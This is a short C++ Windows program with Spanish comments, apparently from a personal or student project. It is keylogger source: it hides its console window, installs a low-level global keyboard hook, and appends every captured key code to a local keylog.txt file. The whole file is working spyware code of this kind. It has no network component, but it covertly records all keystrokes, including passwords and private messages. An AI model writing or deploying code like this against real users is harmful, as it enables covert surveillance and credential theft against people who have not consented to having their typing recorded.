#include <windows.h>
#include <iostream>  // Para imprimir en la consola
#include <fstream>   // Para escribir en el archivo

// Hook para capturar las teclas
HHOOK hKeyHook;

// Función para escribir en el archivo de log (keylog.txt)
void WriteToLogFile(const char* str) {
    std::ofstream log("C:\\Users\\cescanue\\ProyectosWin\\outcore\\tinky\\keylog.txt", std::ios_base::app);  // Abre el archivo en modo append
    if (!log.is_open()) {
        return;  // Si no se puede abrir el archivo, salir silenciosamente
    }
    log << str << std::endl;
    log.close();
}

// Función para escribir en la consola (si es necesario)
void WriteToConsole(const char* str) {
    std::cout << str << std::endl;  // Imprime el mensaje en la consola
}

// Callback para capturar las teclas
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
        char buffer[50];
        sprintf(buffer, "Key captured: %d", pKeyBoard->vkCode);

        // Escribir en el archivo de log
        WriteToLogFile(buffer);
        WriteToConsole(buffer);  // Opcional: Si prefieres eliminar esto, también puedes
    }
    return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
}

// Función para instalar el hook
void InstallHook() {
    WriteToLogFile("Installing keyboard hook...");
    
    hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    
    if (hKeyHook == NULL) {
        WriteToLogFile("Failed to install keyboard hook.");
    } else {
        WriteToLogFile("Keyboard hook installed successfully.");
    }

    // Bucle de mensajes para mantener el hook activo
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}

// Ocultar la consola
void HideConsole() {
    HWND hwnd = GetConsoleWindow();  // Obtener el handle de la consola
    ShowWindow(hwnd, SW_HIDE);       // Ocultar la ventana de la consola
}

// Función WinMain: punto de entrada para aplicaciones Windows
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    // Ocultar la consola
    HideConsole();

    // Escribir en el archivo al inicio
    WriteToLogFile("Keylogger started...");

    // Instalar el hook del teclado
    InstallHook();

    // Si el bucle termina, registrar en el archivo
    WriteToLogFile("Keylogger stopped.");
    return 0;
}
